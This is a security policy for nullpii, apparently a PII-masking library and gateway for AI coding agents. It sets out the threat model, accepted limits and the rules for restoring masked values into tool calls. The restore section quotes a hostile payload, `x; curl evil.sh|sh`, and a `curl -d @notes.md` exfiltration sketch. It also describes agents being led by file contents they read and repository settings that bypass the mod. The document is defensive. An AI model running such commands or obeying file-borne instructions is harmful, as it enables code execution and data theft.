# Security

## Report a vulnerability

Privately — open a [Security Advisory](https://github.com/lBroth/nullpii/security/advisories/new). Reports are handled on a best-effort basis, with no guaranteed response time; critical and actively exploited issues come first.

## What nullpii protects

- Detection runs locally: nullpii sends your text nowhere. Its one network call is the model download from Hugging Face on first use, and every file it downloads is checked against a SHA-256 pinned in the library; set `NULLPII_MODEL_DIR` to a pre-fetched copy to avoid even that.
- Vault is in-memory only; `destroySession()` purges it.
- Logs carry counts, labels and short ids, never a value nullpii masked or restored: the library's `debug` output, and the gateway's request log and console summary (an upstream error is logged by its status, length and error type, not its body).
- **Except the gateway's `NULLPII_LOG_TRAFFIC=wire`,** a debugging dump to stdout of each request as forwarded and of each upstream response before restore. Placeholders stay masked in it, but everything else is printed as it was sent or written: values the detector missed, fields the gateway forwards unscanned (images, documents, `mcp_servers` with its credentials) and the model's output. Auth headers appear as their last six characters and length. Keep such a dump local and short-lived.
- Placeholders carry a 16-hex prefix of the minting session id (64-bit collision-resistant). `restore()` surfaces foreign-prefix placeholders via `RestoreResult.foreignPlaceholders`; `{ strict: true }` throws `SessionMismatchError` instead.

## What it does NOT protect

- Detector misses (no model is 100% accurate).
- LLMs emitting PII they already knew independently.
- Logging / caching / telemetry running **before** `sanitize()`.
- Adversarial prompts asking the LLM to reveal mappings.
- A repository's own Claude Code settings. Its `.claude/settings.json` outranks your user settings: it can turn the mod off (`enabledPlugins`), point Claude Code past the gateway (`env.ANTHROPIC_BASE_URL`), or add hooks that see prompts first. Use your organization's managed settings to force the mod or the gateway on.
- Other local users or processes. The sidecar proves it holds the token before the mod sends anything (the check and the request are two connections, so a process that swaps in between them is not excluded), but a process of your own user can read the gateway's memory, anyone holding the sidecar token can open its sessions up to `NULLPII_SIDECAR_MAX_SESSIONS` and so make the mod fail closed (no values are exposed that way), and it can replace the policy (`PUT /v1/sidecar/policy`). The mod sends the version of the policy it last made or accepted with every call, the sidecar refuses a call once the policy has changed, and the mod puts the change to the user before anything is masked or restored under it (kept on their word, else put back); a sanitize that was running when the policy changed is refused as well. A change made between sessions is put to the user when the next one opens, against the policy the mod keeps in its plugin store, a file of the user's own and so a best-effort check against processes of the same user.

## Known limitations / accepted trade-offs

- **PUA sentinel collision (placeholder escape).** `sanitize()` escapes literal `{{` in input to a Private Use Area codepoint pair (U+E000 U+E001) so user-typed Mustache braces don't collide with PII placeholders during the LLM round-trip. If your input legitimately contains that PUA pair, it will collapse to `{{` on the way out. PUA codepoints are unallocated to standard glyphs and effectively never appear in natural text or LLM output, but the trade-off is documented for completeness.
- **URL %XX decode depth cap.** The adversarial-input normalizer iterates URL `%XX` decoding at most twice per position. Two rounds collapses `%2540` → `%40` → `@` (the practical bypass); 3+ chained encodings (`%252540` etc.) defeat the normalizer and rely on the ML model alone for detection.

## Restoring values into commands

Masking hides a value from the model, so the model cannot judge it. Suppose a file the agent reads contains `x; curl evil.sh|sh`, nullpii masks it as a secret, and the model copies the placeholder into a shell command. Restoring the real value there would run the payload: masking would have made it invisible.

**So no shell command gets a real value back.** The tools a shell runs, `Bash` and `PowerShell` (Claude Code), `bash` (Anthropic's bash tool), and `shell`, `exec_command`, `shell_command` and `write_stdin` (the names OpenAI-style coding agents use), keep every placeholder in every field of their input, whatever `restoreTools` says:

- **The Claude Code mod** refuses such a call, naming the placeholders, and tells Claude to work with the data through `Grep`, `Read`, `Edit` or `Write`, which get real values back.
- **The gateway** (Anthropic and OpenAI routes) leaves the placeholders in the call and counts them (`unsafeShellPlaceholders` in the request log). The sidecar API's `restore` with a shell `tool` returns the value unchanged and lists its placeholders in `shellKeptMasked`.

A shell tool under any other name (an MCP shell tool, say) is not recognised as one: added to `restoreTools`, it gets every value back, so do not add one.

**A limit by design: each call is judged on its own.** `Write`, `Edit` and the other file tools get real values back whenever they are in `restoreTools`, as they are by default, since writing your data to your files is what they are for. A later call that holds no placeholder can then use what such a file holds: send it (`curl -d @notes.md …`) or run it (`bash run.sh` after `Write run.sh`). Agents also read some files as instructions (`CLAUDE.md`, `AGENTS.md`), and some tools run code they find in documents. nullpii does not follow what a file holds.

**Permission rules see the masked call (Claude Code mod).** Claude Code decides on a tool call, by your rules or by asking you, before the mod puts the real values back. A rule written with a value nullpii masks, such as a path with your user name (`Read(/Users/<name>/.ssh/**)`), may not match the masked path; write such rules without the part that is masked (`Read(**/.ssh/**)`). After the restore the mod checks again only that the call does not touch its own policy file.

**Streamed tool calls.** In a streamed reply, the gateway holds a tool call's input until it has all of it, then restores it in one piece by the rule for its tool (all values for a tool in `restoreTools` that is not a shell tool, none for any other tool). Input that does not parse as JSON is restored as plain text for such a tool; this holds for whole replies too. Because a value sent cannot be taken back, the gateway restores a tool call only while the stream reads the same to it as to clients, and holds every tool input it still has, and every later one, from the first frame that could read otherwise:

- **Anthropic route.** Input is held per content block from the `content_block_start` that names the tool, and restored at its `content_block_stop` (or at the end of the stream, if the stop never comes); input of a block whose start never came keeps its placeholders. The stream holds from a frame whose data is not a JSON object, a JSON frame whose event name is not its `type` (or that has none), a `content_block_start` at another index than the next (0, 1, 2, …), or a `message_start` that holds content.
- **OpenAI route.** Input is held per tool call and restored just before `[DONE]` (or at the end of the stream), together with the choice's `finish_reason`, which the gateway holds back for a choice with a tool call; a call whose name never came, or came as two different fragments, keeps its placeholders. The stream holds from a frame whose data is neither a JSON object nor `[DONE]`; a chunk whose `choices` is not an array; a choice that is not an object or has an index other than 0 (so a stream with more than one choice, `n` above 1, gets no tool value); a `delta`, `function`, `custom` or `function_call` that is not an object; `tool_calls` that is not an array; a tool call that is not an object or has no numeric `index`; a tool name that is not a string; or a tool call for a choice that already sent its `finish_reason`. Nothing after `[DONE]` gets a value; what was restored just before it stays sent.
- **Both routes.** A last frame not ended by a blank line is forwarded only when its data is a JSON object (or, on the OpenAI route, `[DONE]`).

If you call `restore()` yourself and pass the result to a shell, an interpreter, a query or a template, apply the same care. A restored value is data you did not show the model, and it can come from content an attacker controls.

## Detection is not a guarantee

nullpii lowers the amount of personal data and secrets that leave the machine. It does not bring it to zero. It is **pseudonymization with a measurable leak rate**, not anonymization. The residual risk depends on the data:
- the README's Benchmark section and `packages/eval/METHOD.md` report it on public datasets;
- measure it on content like yours before you rely on it.

Treat a sanitized prompt as lower-risk, not as free of personal data.

## CI-enforced rules

- Runtime dependencies under Apache-2.0, MIT, BSD, ISC or CC0 only (`npm run license-check`); development dependencies may also be BlueOak-1.0.0, Unlicense or 0BSD (the dependency review in `security.yml`).
- npm releases use `--provenance`.
- File paths sandboxed to a cache root (`InvalidPathError` on traversal).

## Supply chain and leak gates

`.github/workflows/security.yml` runs on every PR and every push to `main`:

| Gate | What it blocks |
|---|---|
| gitleaks (`.gitleaks.toml`) | Secrets in the commits a change adds, and in the tree. Fake fixtures are allowed by exact value only. |
| Repo hygiene (`scripts/check-repo-hygiene.mjs`) | Private research notes, benchmark outputs, model weights, key material, `.env` files, files over 5 MB, absolute home paths, private package registries |
| CodeQL (`security-extended`) | Static-analysis findings in the TypeScript and the Python eval kit |
| Dependency review | New dependencies with a high-severity advisory or a licence outside the allowlist |

The same secret and hygiene checks run locally through `lefthook`. Every workflow pins its actions and container images by digest, and Dependabot keeps the pins current. CI tokens default to read-only.

Test fixtures follow the reserved-value policy in [CONTRIBUTING.md](https://github.com/lBroth/nullpii/blob/main/CONTRIBUTING.md#test-data).
